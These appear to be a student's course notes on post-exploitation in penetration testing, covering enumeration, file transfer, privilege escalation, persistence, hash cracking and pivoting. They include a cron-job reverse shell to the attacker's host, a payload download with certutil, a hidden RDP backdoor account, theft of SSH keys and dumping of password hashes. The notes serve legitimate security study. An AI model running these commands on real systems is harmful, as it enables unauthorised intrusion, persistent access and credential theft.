```toc
```
# Host & Network Penetration Testing: Post-Exploitation #

## Introduction ##

**Topic Overview**
+ Introduction to Post-Exploitation
+ Windows Local Enumeration
+ Linux Local Enumeration
+ Transferring Files To Windows & Linux Targets
+ Upgrading Shells
+ Windows Privilege Escalation
+ Linux Privilege Escalation
+ Windows Persistence 
+ Linux Persistence
+ Dumping & Cracking Windows Hashes
+ Dumping & Cracking Linux Hashes
+ Pivoting 
+ Clearing Your Tracks

## Post-Exploitation ##

### Introduction to Post-Exploitation ###

#### Post-Exploitation ####
+ Final phase of the penetration testing process and consists of tactics, techniques and procedures that attackers/adversaries undertake after obtaining initial access on a target system 
+ **In other words**, what you do once you have gained an initial foothold on a target system
+ Post-exploitation will differ based on the target operating system as well as the target infrastructure 

+ The post-exploitation techniques and tools that you can use will depend on what kind of access you have on the system you have compromised, as well as how stealthy you have to be
+ This ultimately means that you will need to utilize different techniques and tools based on the target OS and its configuration
	+ Some exploits will already elevate privileges 
+ The post- exploitation techniques you can run against the target will need to abide by the rules of engagement agreed on 
+ <mark style="background: #FF5582A6;">Note</mark>: Need to ensure the you have the proper permissions and rights to do post exploitation 

![[Screen Shot 2022-11-09 at 2.15.10 PM.png]]

#### Post-Exploitation Methodology ####
+ In order to perform a thorough and complete post-exploitation phase, we need to utilize a structured methodology that encompasses the most important stages of post-exploitation that can be applied during engagements 
+ This structured, methodological approach ensures that we do not skip/overlook important phases of the post-exploitaion phase in addition to providing us with trackable objectives based on each stage 

![[Screen Shot 2022-11-09 at 2.19.38 PM.png]]

1. **Local Enumeration**
	1. Enumerating Systems Information
	2. Enumerating Users And Groups 
	3. Enumerating Network Information
	4. Enumerating Services 
	5. Automating Local Enumeration 
2. **Transferring Files**
	1. Setting up a web server with python
	2. Transferring Files to Windows Targets
	3. Transferring Files to Linux Target
3. **Upgrading Shells**
	1. Upgrading command shells to meterpreter 
	2. Spawning TTY Shells
4. **Privilege Escalation** 
	1. Identifying PrivEsc Vulns 
	2. Windows PrivEsc
	3. Linux PrivEsc
5. **Persistence** 
	1. Setting Up Persistence On Windows
	2. Setting Up Persistence On Linux
6. **Dumping & Cracking Hashes**
	1. Dumping & Cracking Windows Hashes
	2. Dumping & Cracking Linux Hashes 
7. **Pivoting** 
	1. Internal Network Recon
	2. Pivot 
8. **Clearing You Tracks**
	1. Remove evidence on Windows & Linux



## Windows Enumeration ##

### Enumerating System Information ###

#### System Information ####
+ After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as version. This information is very useful as it gives an idea of what we can do and what type of exploits we can run 
+ **What are we looking for?**
	+ Hostname 
	+ OS Name
	+ OS Build
	+ OS Architecture 
	+ Installed updates/Hotfixes

#### System Enumeration ####

With <mark style="background: #FF5582A6;">Meterpreter</mark>, can do the following:
+ See current hostname/user:
	+ `getuid` 
+ See hostname, OS and Build, Architecture, system language, domain, number of logged on users, and meterpreter session architecture:
	+ `sysinfo` 
+ See attached mounts and drives:
	+ `show_mount` 
+ Check if it is a virtual machine or not 
	+ A <mark style="background: #FF5582A6;">Metasploit</mark> module called `checkvm` 
+ Check for patches:
	+ A <mark style="background: #FF5582A6;">Metasploit</mark> module called `enum_patches` 

With the <mark style="background: #ADCCFFA6;">Shell</mark>, can do the following:
+ See hostname:
	+ `hostname` 
+ See all system information including, all information about OS, Processor, Bios, Default directories, Boot device, hardware/resource information, Domain, Hotfixes (Can google what they are patching), Network card info, If it is a Hyper Visor:
	+ `systeminfo` 
+ See information regarding the hotfixes, including a description such as (Security Update), and a link to read about it:
	+ `wmic qfe get Caption,Description,HotFixID,InstalledOn`
+ See Operating system version, <mark style="background: #FFF3A3A6;">Not on all windows</mark> :
	+ `cd C:\\`
	+ `cd Windows\System32`
	+ `cat eula.txt`

### Enumerating Users & Groups ###

#### Users & Groups ####
+ After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to, and other user accounts on the system 
+ What are we looking for?
	+ Current user & privileges 
	+ Additional user information 
	+ Other users on the system 
	+ Groups 
	+ Members of the build-in administrator group 

#### User & Group Enumeration ####

With <mark style="background: #FF5582A6;">Meterpreter</mark>, can do the following:
+ See current hostname/user, quickly see if we are the <mark style="background: #FFB86CA6;">Administrator</mark>:
	+ `getuid` 
+ Can see what privileges we have with:
	+ `getprivs` 
+ Can see current users that are logged on as well as previous logons 
	+ a <mark style="background: #FF5582A6;">Metasploit</mark> module called `enum_logged_on_users`, just needs current session
+ Can see more info about privileges using:
	+ a <mark style="background: #FF5582A6;">Metasploit</mark> module called `win_privs` 

With the <mark style="background: #ADCCFFA6;">Shell</mark>, can do the following:
+ See hostname:
	+ `whoami` 
+ See privileges:
	+ `whoami \priv` 
+ See currently logged on users 
	+ `query user` 
+ Show all other accounts on the system 
	+ `net users` 
+ Learn about a user with:
	+ `net user USERNAME` 
+ See all groups on the system
	+ `net localgroup` 
+ See all users in a specified group, and a comment about that group (**administrators** is a good one to check)
	+ `net localgroup GROUP` 

### Enumerating Network Information ###

#### Network Information ####
+ **What are we looking for?**
	+ Current IP address & network adapter
	+ Internal networks
	+ TCP/UDP services running and their respective ports
	+ Other hosts on the network
	+ Routing table
	+ Windows Firewall state

#### Network Enumeration ####

With <mark style="background: #FF5582A6;">Meterpreter</mark>, can do the following:
+ Enumerate computers on the network domain:
	+ a <mark style="background: #FF5582A6;">Metasploit</mark> module called `enum_computers` 
+ Can look for shares 
		+ a <mark style="background: #FF5582A6;">Metasploit</mark> module called `enum_shares` 

With the <mark style="background: #ADCCFFA6;">Shell</mark>, can do the following:
+ See IP address and other DHCP information:
	+ `ipconfig`
+ See all IP address info for all adapters (Will have MAC info, DHCP info, masks, ):
	+ `ipconfig /all` 
+ Display routing table:
	+ `route print` 
+ See other systems on the network via the arp table
	+ `arp -a` 
+ See services running/listening, can also see established connections  
	+ `netstat -ano` 
+ See state of windows firewall 
	+ `netsh firewall show state` (Can be deprecated)
	+ `netsh advfirewall firewall dump` (See configuration)
	+ `netsh advfirewall show allprofiles` (See if it is running)
		+ Will give an error if it is not
		+ Documentation can be seen with `netsh advfirewall` 

### Enumerating Processes & Services ###

#### Processes & Services ####
+ After gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and scheduled tasks are currently running 
+ **What are we looking for?**
	+ Running processes & services
	+ Scheduled tasks
+ A process is an instance of a running executable/program 
+ A service is a process which runs in the background and does not interact with the desktop 

#### Processes & Services Enumeration ####

With <mark style="background: #FF5582A6;">Meterpreter</mark>, can do the following:
+ See running processes, user and privileges associated with the process, and path:
	+ `ps` 
+ Find process ID, and migrate to another process 
	+ `pgrep PROCESS_NAME`
	+ `migrate PROCESS_ID`
		+ <mark style="background: #FFB86CA6;">Note</mark>: the explorer.exe process is very stable for windows and a recommended migration 
+ See installed applications:
		+ a Metasploit module called `enum_applications` 

With the <mark style="background: #ADCCFFA6;">Shell</mark>, can do the following:
+ See list of started services:
	+ `net start` 
	+ `wmic service list brief`
+ See process running, and show what services are running under it:
	+ `tasklist /SVC` 
+ See scheduled tasks:
	+ `schtasks /query /fo LIST /v`
		+ <mark style="background: #FFB86CA6;">Note</mark>: tasks running with high privileges can potentially be used for privilege escalation 

### Automating Windows Local Enumeration ###

#### Automating Enumeration ####
+ In addition to performing local enumeration manually, can also use scripts and MSF modules
+ Manual is important to know, but it is also important to be time efficient. So will need to learn how to use various enumeration scripts 
+ In addition to automating enumeration, can also get additional information such as:
	+ Privilege escalation vulnerabilities 
	+ Locally stored passwords
	+ Etc.

#### Windows Local Enum Scripts ####
+ <mark style="background: #D2B3FFA6;">JAWS</mark> - Just Another Windows (Enum) Script 
+ JAWS is a PowerShell script designed to help penetration testers (and CTF players) quickly identify potential privilege escalation vectors on Windows systems.
+ Written using PowerShell 2.0, so should run on every Windows version since Windows 7
+ GitHub Repo: [JAWS](https://github.com/411Hall/JAWS)
	+ Will need to transfer the .ps1 onto the target, (The <mark style="background: #BBFABBA6;">Temp directory</mark> is a good place for it),
	+ Then make it executable: `powershell.exe ExecutionPolicy Bypass File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt` 
	+ Can view the output in <mark style="background: #D2B3FFA6;">JAWS-Enum.txt</mark>

#### Metasploit Enumeration ####
+ In addition to manual enumeration, there are many modules on <mark style="background: #FF5582A6;">Metasploit</mark> that automate 

## Linux Enumeration ##

### Enumerating System Information ###

#### System Information ####
+ After gaining initial access to a target system, it is always important to learn more about the system. It gives us an idea of what we can do and the exploits that can be run 
+ **What are we looking for?**
	+ Hostname
	+ Distribution & distribution release version 
	+ Kernel version & architecture 
	+ CPU information 
	+ Disk information & mounted drives 
	+ Installed packages/software 

#### System Enumeration ####
With <mark style="background: #FF5582A6;">Meterpreter</mark>, can do the following:
+ Upgrade a session to a meterpreter with:
	+ `sessions -u SESSION_NUM` 
+ See uid, euid, and egid:
	+ `getuid` 
+ See Hostname/IP, OS and version, Architecture, and meterpreter session :
	+ `sysinfo` 
+ Gather linux configurations 
	+ A <mark style="background: #FF5582A6;">Metasploit</mark> module called `enum_configs` 
	+ Can copy the paths to see what it found 

With <mark style="background: #D2B3FFA6;">bash</mark>, can do the following:
+ Can spawn a bash session with:
	+ `/bin/bash -i` 
+ Identify the hostname:
	+ `hostname` 
+ See the OS distribution running:
	+ `cat /etc/issue` 
+ See more distribution information, including version, ID, home, support and bug urls:
	+ `cat /etc/*release`  
+ Enumerate kernel version 
	+ `uname -a` 
	+ `uname -r` (to only see version)
+ See environment variables for the user:
	+ `env` 
+ See cpu information:
	+ `lscpu` 
+ See how much ram is being consumed:
	+ `free -h` 
+ See drives and mounts:
	+ `df -h` 
+ See all installed packages:
	+ `dpkg -l` 

### Enumerating Users & Groups ###

+ After gaining initial access to a target system, it is important to learn what user accounts have access to, and other accounts on the system/
+ **What are we looking for?**
	+ Current user & privileges
	+ Other users on the system
	+ Groups

#### Users & Groups Enumeration ####
With <mark style="background: #FF5582A6;">Meterpreter</mark>, can do the following:
+ Gather system and User Information:
		+ A Metasploit module called: `enum_system` 

With <mark style="background: #D2B3FFA6;">bash</mark>, can do the following:
+ See username, root will be highest privileges:
	+ `whoami` 
+ See a users groups with:
	+ `groups USER` 
+ See all user accounts and service accounts:
	+ `cat /etc/passwd` 
		+ a user account will have a specified shell, other wise it will say <mark style="background: #FFF3A3A6;">nologin</mark>
		+ Also will see them with `ls /home` 
		+ Can add a user with: `useradd -m USER -s /bin/bash`
![[rsg02-02-etc-passwd-file.png]]
+ See all groups on the system:
	+ `groups` 
		+ can add a user to a group with `usermod -aG GROUP USER` 
+ See a list of legitimate users who last logged onto the system
	+ `last` 
+ Show a list of users who have logged into the system and the last time they did, as well as how they did 
	+ `lastlog` 

### Enumerating Network Information ###

#### Network Information ####
+ What are we looking for?
	+ Current IP address & network adapter
	+ Internal networks
	+ TCP/UCP services running and their respective ports
	+ Other hosts on the network (for pivoting)

#### Network Enumeration ####
With <mark style="background: #FF5582A6;">Meterpreter</mark>, can do the following:
+ Can see current IP on various interfaces, mac addresses, network mask
	+ `ifconfig`
+ See currently running TCP and UDP services
	+ `netstat` 
		+ can see which one is the meterpreter session via the port set (4433 for example)
+ See current know routes 
	+ `route` 
+ See other machines on the network using the arp table 
	+ `arp` 
+ See network information:
	+ A <mark style="background: #FF5582A6;">Metasploit</mark> module called: `enum_network`
+ Check if it is a virtual machine 
	+ A <mark style="background: #FF5582A6;">Metasploit</mark> module called: `checkvm` 

With <mark style="background: #D2B3FFA6;">bash</mark>, can do the following:
+ Can see current IP on various interfaces, mac addresses, network mask
	+ `ifconfig` or `ip a` 
+ See a list of interfaces and configurations in the network file
	+ `cat /etc/networks` 
+ See hostname 
	+ `cat /etc/hostname` 
	+ more info with: `cat /etc/hosts` 
+ See DNS information:
	+ `cat /etc/resolv.conf` 
+ See other machines on the network using the arp table 
	+ `arp -a`

### Enumerating Processes & Cron Jobs ###

#### Processes & Cron Jobs ####
+ After gaining initial access to a target system, it is always important to learn about the processes, services, and scheduled tasks are currently running
+ **What are we looking for?**
	+ Running services
	+ Cron job
		+ The linux implementation of scheduled tasks

#### Processes & Cron Jobs Enumeration ####
With <mark style="background: #FF5582A6;">Meterpreter</mark>, can do the following:
+ See running Process's:
	+ `ps` 
	+ can use `pgrep` to search for specific processes 

With <mark style="background: #D2B3FFA6;">bash</mark>, can do the following:
+ See running Process's:
	+ `ps aux` , and can pipe it to grep 
+ See list of processes that are running dynamically, as well as resources in real time
	+ `top` 
+ See cron jobs for a specific user 
	+ `crontab -l` 
+ See cron job information files
	+ `ls -al /etc/cron*`
	+ `cat /etc/crontab` 

### Automating Linux Local Enumeration ###

#### Automating Enumeration ####
+ In addition to performing local enumeration manually, can also use scripts and MSF modules
+ This automation will help with time efficiency 
+ In addition to automating the process of enumeration information like system information, user & group, etc, these automation enumeration scripts will provide additional information regarding the target system, such as privilege escalation vulnerabilities, stored passwords, etc.

#### LinEnum ####
+ A bash script that automates common Linux local enumeration checks in addition to identifying privilege escalation vulnerabilities
+ GitHub Repo: [LinEnum Repo](https://github.com/rebootuser/LinEnum)

#### LinEnum Hands-on ####
+ Should navigate to the /temp directory 
+ Go to the repository, and copy the `LinEnum.sh` file (can move it into a file with your clipboard as well)
+ Will upload that file to the temp directory:
	+ With <mark style="background: #FF5582A6;">meterpreter</mark> can do `upload root/Desktop/LinEnum.sh` 
+ Then get a shell and run the file
+ Will display lots of information, and should send it to a file safely 

## Transferring Files ##

### Setting Up a Web Server With Python ###

#### Transferring files to target system ####
+ After obtaining initial access to a target system, will need to transfer files to the target system 
+ In some cases, will not have access to the target system via a Meterpreter session, so will need to use inbuilt OS utilities to facilitate the transfer of files from your system to the target system 
+ This process utilizes a two-step approach, where you will need to host the files you want to transfer on a web server and download the files hosted on the web server to the target system

#### Web server with python ####
+ Python comes with a built-in module known as SimpleHTTPServer(python2) and http.server (python3), that can be used to facilitate a simple HTTP server that gives you standard GET and HEAD request handlers 
+ This module can be used to host files in any directory of your system, and can be implemented through a single command in your terminal 
	+ Will host the files of the current directory 
	+ Will show information about request made

#### Python scripts ####
+ <mark style="background: #ADCCFFA6;">Python2</mark>: `python -m SimpleHTTPServer 80` 
+ <mark style="background: #BBFABBA6;">Python3</mark>: `python3 -m http.server 80`
	+ Where 80 specifies the desired port to host on 

### Transferring Files to The Target ###

#### Windows ####
+ One access is made on the target, should navigate to the <mark style="background: #FFB86CA6;">Temp</mark> directory in `C:\\`
	+ Will make one with `mkdir Temp` if one is not available 
+ Will now host the file we want to transfer with the web server python script
+ Can download the file with the <mark style="background: #FFF3A3A6;">certutil</mark> utility 
	+ `certutil -urlcache -f http://KALI_IP/PAYLOAD.exe NAME.exe 
	+ `-f` specifies a file download 
	+ `NAME` is what it will be downloaded as on the windows system 

#### Linux ####
+ One access is made on the target, should navigate to the <mark style="background: #FFB86CA6;">Temp</mark> directory in `/tmp/`
+ Will now host the file we want to transfer with the web server python script
+ Can download the file with the <mark style="background: #D2B3FFA6;">wget</mark> utility 
	+ `wget http://KALI_IP/PAYLOAD.exe`


## Shells ##

### Upgrading Non-Interactive Shells ###

#### Non-Interactive Shells ####
+ These are the shells received that only **show a blank line** (no username or directory)
+ can use get a bash session with
	+ `/bin/bash -i` (under the assumption that bash is installed)
+ Can display the list of shells with
	+ `cat /etc/shells` 
+ Can use python as a shell
	+ See if it is installed: `python --version` 
	+ Start a bash session: `python -c 'import pyt; pty.spawn("/bin/bash")'
+ Can also use perl or ruby if they are installed 
+ Should display the <mark style="background: #BBFABBA6;">environment variables</mark> after and upgrade with: `env`
	+ If there is no PATH variable, should make one with `export PATH=/usr/local/sbin:/user/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
		+ This is the paths to the executable 
	+ set the term if needed with: `export TERM=xterm` 
	+ Make the shell variable: `export SHELL=bash` 

## Escalation ##

### Identifying Windows Privilege Escalation Vulnerabilities ###

#### Identifying PrivEsc Vulnerabilities ####
+ In order to elevate your privileges on Windows, you must first, identify privilege escalation vulnerabilities that exist on the target system 
+ This process will differ greatly based on the type of target you gain access to, all based on the systems unique configuration and version of windows 
+ This process can be tedious and time consuming, so it is recommended to automate the process
	+ This can be done through the use of various automation scripts 

#### PrivescCheck ####
+ PrivescCheck aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation 
	+ It also gathers various information that might be useful for exploitation and/or post-exploitation 
+ GitHub Repo: [PrivescCheck Repo](https://github.com/itm4n/PrivescCheck)
	+ A powershell script 

#### Hands-on PrivEsc####
+ Can get initial access to a system without vulnerable services using the <mark style="background: #FF5582A6;">Metasploit</mark> module: `multi/script/web_delivery` 
	+ Will set the target to powershell: `set target PSH` 
	+ Set payload: `windows/shell/reverse_tcp` 
	+ Can turn off PSH encoding in base64 with: `set PSH-EncodedCommand false`
	+ Set Kali IP as LHOSt with `set LHOST eth1` 
+ Will now <mark style="background: #ADCCFFA6;">copy the powershell code and run it on the victim</mark> 
	+ This will start a shell connection to Kali
	+ Can now turn the shell to a meterpreter using: `shell_to_meterpreter` module
+ Not that there is initial access, can <mark style="background: #BBFABBA6;">execute</mark> it with:
	+ `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck" 
		+ where `ep bypass` will bypass the default execution policy when running PowerShell scripts from the windows command line 
	+ Will end with a <mark style="background: #FFB86CA6;">PrivescCheck Report</mark> with other show each check it runs as well as results found above
		+ can also do an extended check with `-Extended` 

### Windows Privilege Escalation ###

#### Escalation with clear-text WinLogon registry passwords ####
+ <mark style="background: #FF5582A6;">PrivescCheck</mark> can be used to check if there are any clear-text passwords 
+ The WinLogon feature on windows is used to allow a user to automatically logon 
	+ The credentials are typically stored in the windows registry, and sometimes they are not encrypted 
+ Windows has a feature to allow <mark style="background: #BBFABBA6;">authentication with SMB</mark>, this can be manipulated to allow the logon of our stollen credentials 
	+ Can use `psexec.py Administrator@TARGET_IP`
		+ Where Administrator is the user being logged on as 
	+ Now logged in, and can use `whoami` to see what privileges that user has, where `nt authority\system` is the highest 
	+ `whoami /priv` will show what privileges are available 
+ Can also use `windows/smb/psexec` <mark style="background: #FF5582A6;">Metasploit</mark> module 

### Linux Privilege Escalation - Weak Permissions ###

#### Linux Privilege Escalation Automation ####
+ The <mark style="background: #D2B3FFA6;">linEnum</mark> script will also enumerate privilege escalation 
	+ GitHub Repo: [LinEnum Repo](https://github.com/rebootuser/LinEnum)

#### Weak Permissions ####
+ Will do the same initial enumeration 
	+ `whoami` 
	+ `cat /etc/passwd` 
	+ `groups`
	+ `cat /etc/groups` 
+ Will use a find command that looks for modes that allow anyone to edit that file
	+ `find / -not -type l -perm -o+w` 
	+ Files under `/etc/` for example are often useful for escalation
		+ Being able to edit `/etc/shadow` will allow a user to change the password of the root into something that is known 
+ Generate a linux password 
	+ `openssl passwd -1 -salt abc PASSWORD`
		+ Where -1 will use the weakest encryption, abc is the salt, and PASSWORD is the clear text password
			+ `$1$abc$BXBqpb9BZcZhXLgbee.0s/` 
		+ Will paste that in after the login 
+ Can now use `su` to <mark style="background: #FFB86CA6;">switch to the super user (root)</mark>

![[Screen Shot 2022-11-14 at 4.11.45 PM.png]]

### Linux Privilege Escalation - Sudo Privileges ###

#### Sudo Enumeration ####
+ `sudo -l` Will show a list of commands the current user can run
+ The user might be able to run certain executable with sudo without a password 
	+ Even a harmless exe like man (manual), allows the user to spawn a bash session, and if done with sudo, will be a super user bash session
+ <mark style="background: #FF5582A6;">Binaries that have sudo privileges without a password</mark> should be investigated, as there <mark style="background: #FF5582A6;">could be a way to insert privilege escalation</mark>

## Persistence ##

### Windows Persistence  ###

#### Persistence ####
+ **Persistence** consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code - <mark style="background: #FFB86CA6;">MITRE ATT&CK</mark> 
	+ [MITRE ATT&CK](https://attack.mitre.org/) shows information about the entire attack methodology, as well as specific persistence techniques 
+ Gaining an initial foothold is not enough, need to maintain access to the targets

#### Windows Persistence Via Services ####
+ Will start with normal local enumeration:
	+ `sysinfo` , `getuid`, etc
+ The <mark style="background: #FF5582A6;">Metasploit</mark> module `persistence_service` will allow a service to be setup that allows attacker persistence, will generate a process, and then configure it at a service 
	+ Will specify an artifact being made to run the service, this should be removed by the end of the engagement 
	+ Will provide a resource script to do so 
+ Can reconnect using `mult/handler` <mark style="background: #FF5582A6;">Metasploit</mark> module
	+ Will need to specify the exact options used when making the service 

#### Windows Persistence Via RDP ####
+ Will first get initial access, as well as privilege
+ On <mark style="background: #FF5582A6;">Metasploit</mark>, can use the <mark style="background: #BBFABBA6;">getgui</mark> script to enable remote desktop and create a user account to log onto it with 
	+ Example: `run getgui -e -u alexis -p hacker_123321` 
		+ `-e` will enable RDP only
		+ `-u` specifies the username
		+ `-p` specifies the password
	+ Will have helpful clean and secrecy features 
+ Can now use a tool such as <mark style="background: #FFB86CA6;">xfreerdp</mark> to begin an RDP connection 
	+ Example: `xfreerdp /u:alexis /p:hacker_123321 /v:10.4.21.80` 
		+ `/u:` specifies the username
		+ `/p:` specifies the password
		+ `/v:` specifies the IP
+ Will now have access whenever is needed, though an admin could still find this
	+ <mark style="background: #FF5582A6;">NOTE</mark>: Should try and make the user blend in 

### Linux Persistence ###

#### Persistence ####
+ **Persistence** consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code - <mark style="background: #FFB86CA6;">MITRE ATT&CK</mark> 
	+ [MITRE ATT&CK](https://attack.mitre.org/) shows information about the entire attack methodology, as well as specific persistence techniques 
+ Gaining an initial foothold is not enough, need to maintain access to the targets

#### Linux Persistence Via SSH Keys ####
+ Linux is typically deployed as a server operating system, and as a result, Linux servers are typically accessed remotely via services such as SSH
+ If SSH is enabled and running on a Linux system, you can take advantage of the SSH configuration to establish persistent access on the target system.
+ In most cases Linux server will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password
+ After gaining access to a Linux system, can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access
+ **After gaining initial access**:
	+ Can ls the home directory, and see the `.ssh` file 
		+ Within that directory, there will be a folder called `id_rsa`, which will be the private key
		+ Will then copy that private key over ssh using <mark style="background: #ADCCFFA6;">scp</mark>, which allows copying over ssh 
			+ `scp student@192.85.208.3:~/.ssh/id_rsa .` 
		+ Will then give the private key the required permissions using: `chmod 400 id_rsa`
	+ Can now log in as the user with the private key
		+ `ssh -i id_rsa student@192.85.208.3
+ **Another typical flow of SSH persistence**:
	+ Could ideally generate a SSH key pair on the Kali linux system, keep the private key on Kali, and transfer the public key onto the system in the `.ssh` file under authorized keys

#### Linux Persistence Via Cron Jobs ####
+ Linux implements task scheduling though a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule 
+ An application, or script that has been configured to be run repeatedly with Cron is known as a Cron Job
+ Can use cron jobs toe execute a command or script at a fixed interval to ensure we have persistent access to the target system
	+ Can maliciously set one to execute continuously, with a reverse shell for example 
+ <mark style="background: #D2B3FFA6;">Anatomy of a Cron Job</mark>:
![[Screen Shot 2022-11-16 at 3.14.01 PM.png]]
+ **After gaining initial access**:
	+ Can enumerate the cron job information with: `cat /etc/cron*`
	+ Can make a cron job reverse shell with: `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/1234 0>&1'" > cron 
	+ Can add it as a cron job with `crontab -i cron`
		+ Can view it with `crontab -l` 
	+ Can connect to it with `nc -nvlp 1234` 

## Dumping & Cracking ##

### Dumping & Cracking Windows Hashes (NTLM) ###

#### Windows Password Hashes ####
+ The Windows OS stores hashed user account passwords locally in the <mark style="background: #ADCCFFA6;">SAM (Security Account Manager)</mark> database
+ Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.
+ Authentication and verification of user credentials is facilitated by the <mark style="background: #FFF3A3A6;">Local Security Authority (LSA)</mark>
+ Windows versions up to Windows Server 2003 utilize two different types of hashes:
	+ **LM**
	+ **NTLM**
+ Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onward
	+ <mark style="background: #FF5582A6;">NOTE</mark>: There are various versions of NTLM including NTLMv1 and NTLMv2

#### SAM Database ####
+ SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed
+ The SAM database file cannot be copied while the OS is running
	+ Though sometimes, the windows OS will make a copy when it runs into an issue, or an admin will 
+ The Windows NT kernel keeps the SAM database file locked and as a result attackers typically utilize in-memory techniques and tools to dump <mark style="background: #ADCCFFA6;">SAM</mark> hashes from the <mark style="background: #FFB86CA6;">LSASS</mark> process cache
+ In modern versions of Windows, the SAM database is encrypted with a **syskey** 
+ <mark style="background: #FF5582A6;">NOTE</mark>: Elevated/Administrative privileges are required in order to access and interact with the LSASS process

#### NTLM (NTHash) ####
+ NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully 
+ From Windows Vista onwards, Windows disabled LM hashing and utilizes NTLM hashing
+ When a user account is created, it is encrypted using the <mark style="background: #D2B3FFA6;">MD4</mark> hashing algorithm, while the original password is disposed of 
+ NTLM improves upon LM in the following ways:
	+ Dows not split the hash in to two chunks
	+ Case sensitive 
	+ Allows the use of symbols and unicode characters
![[Screen Shot 2022-11-16 at 3.47.57 PM.png]]

#### Dumping & Cracking NTLM Hashes ####
+ Can dump Windows password hashes by leveraging various utilities like:
	+ The inbuilt meterpreter "`hashdump`" command
	+ **Mimikatz**
+ After we have dumped the hashes, can crack them through the use of the following utilities:
	+ <mark style="background: #FF5582A6;">John The Ripper</mark>
	+ <mark style="background: #FF5582A6;">Hashcat</mark> 

#### Getting Windows NTLM Hashes ####
+ After initial access and elevated privileges, can use the command `hashdump` 
	+ Should make sure and migrate to the LSASS process to upgrade and stabilize meterpreter 
	+ Can use `netuser` to see that you have all users 

#### Cracking NTLM Hashes With John The Ripper ####
+ Can get help by using `john`
	+ Can look for available formats that resemble NT with: `john --list=formats | grep NT` 
	+ Will see NT
+ Can specify a word list with `--wordlist=PATH/TO/WORDLIST`, else it will use its default 
	+ A good wordlist is `gzip -d /usr/share/wordlist/rockyou.txt.gz` 
+ Now <mark style="background: #FF5582A6;">can run John The Ripper</mark> with:
	+ `john --format=NT hashes.txt`

#### Cracking NTLM Hashes With Hashcat ####
+ Can get help by using `hashcat --help`
+ Will specify the type of hash using `-m`
	+ Will need to use the ID of the hash type listed in the help screen, for example: **NTLM is 1000**
+ Will specify the mode using `-a`
	+ Will need to use the ID of the mode listed in the help screen, for example: **brute-force is 3** 
+ Now can run <mark style="background: #FF5582A6;">Hashcat</mark> with:
	+ `hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
		+ Where hashes.txt is the file to crack, and the path is to the wordlist to use

#### Utilizing Cracked Hashes ####
+ Can authenticate using RDP, psExec, etc

### Dumping & Cracking Linux Password Hashes ###

#### Linux Password Hashes ####
+ Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server
+ All of the information for all accounts on Linux is stored in the passwd file located in: `/etc/passwd `
+ Cannot view the passwords for users in the passwd file because they are encrypted and the passwd file is readable by any user on the system 
+ All the encrypted passwords for the users are stored in the shadow file, it can be found in the following directory: `etc/shadow` 
+ The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords 

#### Shadow File Information ####
+ The shadow file gives us information in regards to the hashing algorithm that is being used and the password hash 
	+ Can determine this by looking at the number after the username encapsulated by the dollar symbol ($)
![[Screen Shot 2022-11-16 at 4.27.17 PM.png]]

#### Getting the Hash in Linux ####
+ Can cat the `/etc/shadow` file, or use the `linux/gather/hashdump` <mark style="background: #FF5582A6;">Metasploit</mark> module

#### Cracking Linux Password Hashes With John The Ripper ####
+ Can get help by using `john`
	+ Can look for available formats that resemble NT with: `john --list=formats | grep sha512` 
	+ Will see `sha512crypt`
+ Can specify a word list with `--wordlist=PATH/TO/WORDLIST`, else it will use its default 
	+ A good wordlist is `gzip -d /usr/share/wordlist/rockyou.txt.gz` 
+ Now <mark style="background: #FF5582A6;">can run John The Ripper</mark> with:
	+ `john --format=sha512crypt hashes.txt

#### Cracking NTLM Hashes With Hashcat ####
+ Can get help by using `hashcat --help`
+ Will specify the type of hash using `-m`
	+ Will need to use the ID of the hash type listed in the help screen, for example: **Sha512 is 1800**
+ Will specify the mode using `-a`
	+ Will need to use the ID of the mode listed in the help screen, for example: **brute-force is 3** 
+ Now can run <mark style="background: #FF5582A6;">Hashcat</mark> with:
	+ `hashcat -a 3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt`
		+ Where hashes.txt is the file to crack, and the path is to the wordlist to use


## Pivoting ##

+ Pivoting is a post exploitation technique that involves utilizing a compromised host that is connected to multiple networks to gain access to systems within other networks 
+ After gaining access to one host, can use the compromised host to exploit other hosts on a private internal network to which we could not access previously 
+ Meterpreter provides the ability to add a network route to the internal network subnet, perform port forwarding and consequently scan and exploit other systems on the network

### Port Forwarding ###

+ Port forwarding is the process of redirecting traffic from a specific port on a target system to a specific port on out system 
+ In the context of pivoting, can forward a remote port on a previously inaccessible host to a local port on our Kali Linux system so that we can remotely interact/exploit the service running on the port

#### Pivoting Visualized ####
![[Screen Shot 2022-11-18 at 10.40.25 AM.png]]

#### Hands on ####
+ Will need to first add a route to the network of victim 1 and victim 2 (<mark style="background: #FF5582A6;">NOT to the network we are already on</mark>)
	+ `run autoroute -s 10.10.10.10/24`
